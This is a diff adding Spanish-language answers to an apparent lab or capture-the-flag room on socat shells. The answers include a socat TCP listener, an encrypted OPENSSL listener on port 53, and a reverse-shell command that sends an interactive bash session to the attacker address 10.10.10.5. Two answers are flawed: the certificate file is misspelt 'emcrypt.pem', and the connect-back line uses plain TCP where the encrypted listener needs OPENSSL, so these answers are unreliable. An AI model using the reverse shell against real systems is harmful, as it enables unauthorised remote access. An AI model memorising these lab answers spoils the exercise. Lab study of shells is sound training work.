@@ -33,3 +33,19 @@ Al usar un shell de enlace, ¿ejecutaría un oyente en el atacante (A) o el obje
 
 ## Socat
 
+¿Cómo conseguiremos que socat escuche en el puerto TCP 8080?
+
+    TCP-L:8080
+
+## Socat Encrypted Shells 
+
+¿Cuál es la sintaxis para configurar un OPENSSL-LISTENER usando la técnica tty de la tarea anterior? Utilice el puerto 
+53 y un archivo PEM llamado "encrypt.pem"
+ 
+    socat OPENSSL-LISTENER:53,cert=emcrypt.pem,verify=0 FILE:`tty`,raw,echo=0
+
+Si su IP es 10.10.10.5, ¿qué sintaxis usaría para conectarse de nuevo a este oyente?
+
+    socat TCP:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+
